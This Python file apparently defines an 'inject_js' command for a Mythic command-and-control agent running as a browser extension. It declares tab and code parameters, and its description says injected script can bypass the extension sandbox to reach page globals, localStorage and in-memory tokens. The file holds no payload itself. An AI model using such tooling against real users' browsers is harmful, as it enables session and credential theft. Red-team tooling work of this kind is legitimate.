from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class InjectJsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="tab_id",
                type=ParameterType.Number,
                description="ID of the tab to inject into (0 or empty = active tab)",
                default_value=0,
            ),
            CommandParameter(
                name="code",
                type=ParameterType.String,
                description="JavaScript to inject, executed in the page's own context. An optional <script>...</script> wrapper is stripped.",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class InjectJsCommand(CommandBase):
    cmd = "inject_js"
    needs_admin = False
    help_cmd = "inject_js [tab_id] [code]"
    description = (
        "Inject JavaScript into a tab, executed in the page's own context "
        "(bypasses the isolated-world sandbox, so it can reach page globals, "
        "localStorage and in-memory tokens). Defaults to the active tab."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1059.007"]
    argument_class = InjectJsArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
